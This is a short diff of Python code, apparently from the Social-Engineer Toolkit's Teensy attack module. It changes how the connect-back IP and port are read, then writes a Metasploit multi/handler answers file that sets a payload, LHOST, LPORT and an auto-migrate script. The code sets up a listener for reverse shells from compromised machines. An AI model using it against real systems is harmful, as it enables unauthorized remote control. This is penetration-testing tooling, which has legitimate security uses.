@@ -148,10 +148,21 @@ filewrite.write(teensy)
 filewrite.close()
 choice = yesno_prompt("0","Do you want to start a listener [yes/no]: ")
 if choice == "YES":
-        fileopen = file("src/program_junk/ipaddr.file", "r")
-        ipaddr = fileopen.read()
-        fileopen = file("src/program_junk/port.options", "r")
-        port = fileopen.read()
+
+
+        # Open the IPADDR file
+        if check_options("IPADDR=") != 0:
+                ipaddr = check_options("IPADDR=")
+        else:
+                ipaddr=raw_input(setprompt(["6"], "IP address to connect back on"))
+                update_options("IPADDR=" + ipaddr)
+	
+	if check_options("PORT=") != 0:
+		port = check_options("PORT=")	
+
+	else:
+		port = raw_input("Enter the port to connect back on: ")
+
         filewrite = file("src/program_junk/metasploit.answers", "w")
         filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset AutoRunScript post/windows/manage/smart_migrate\nexploit -j" % (payload,ipaddr,port))
         filewrite.close()
